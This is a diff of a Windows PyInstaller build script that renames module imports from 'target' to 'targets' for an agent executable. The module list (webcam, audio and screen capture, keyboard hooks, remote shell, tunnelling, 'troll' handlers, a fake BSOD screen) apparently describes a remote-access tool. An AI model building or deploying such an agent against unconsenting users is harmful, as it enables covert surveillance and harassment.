@@ -65,20 +65,20 @@ python -m PyInstaller --console --onefile --noupx --name %AGENT_NAME% %ICON_FLAG
     --exclude-module pywinauto ^
     --exclude-module uiautomation ^
     --exclude-module nodriver ^
-    --hidden-import=target.input_controller ^
-    --hidden-import=target.privacy ^
-    --hidden-import=target.capture ^
-    --hidden-import=target.audio ^
-    --hidden-import=target.webcam ^
-    --hidden-import=target.auditor ^
-    --hidden-import=target.shell_handler ^
-    --hidden-import=target.process_manager ^
-    --hidden-import=target.file_manager ^
-    --hidden-import=target.clipboard_handler ^
-    --hidden-import=target.device_settings ^
-    --hidden-import=target.troll_handler ^
-    --hidden-import=target.troll_video_player ^
-    --hidden-import=target.bsod_screen ^
+    --hidden-import=targets.input_controller ^
+    --hidden-import=targets.privacy ^
+    --hidden-import=targets.capture ^
+    --hidden-import=targets.audio ^
+    --hidden-import=targets.webcam ^
+    --hidden-import=targets.auditor ^
+    --hidden-import=targets.shell_handler ^
+    --hidden-import=targets.process_manager ^
+    --hidden-import=targets.file_manager ^
+    --hidden-import=targets.clipboard_handler ^
+    --hidden-import=targets.device_settings ^
+    --hidden-import=targets.troll_handler ^
+    --hidden-import=targets.troll_video_player ^
+    --hidden-import=targets.bsod_screen ^
     --hidden-import=pynput.keyboard._win32 ^
     --hidden-import=pynput.mouse._win32 ^
     --hidden-import=numpy ^
@@ -87,8 +87,8 @@ python -m PyInstaller --console --onefile --noupx --name %AGENT_NAME% %ICON_FLAG
     --hidden-import=cv2 ^
     --hidden-import=requests ^
     --hidden-import=psutil ^
-    --hidden-import=target.tunnel_manager ^
-    --hidden-import=target.kiosk ^
+    --hidden-import=targets.tunnel_manager ^
+    --hidden-import=targets.kiosk ^
     --hidden-import=pillow_jxl ^
     --hidden-import=zstandard ^
     --add-data "target;target" ^
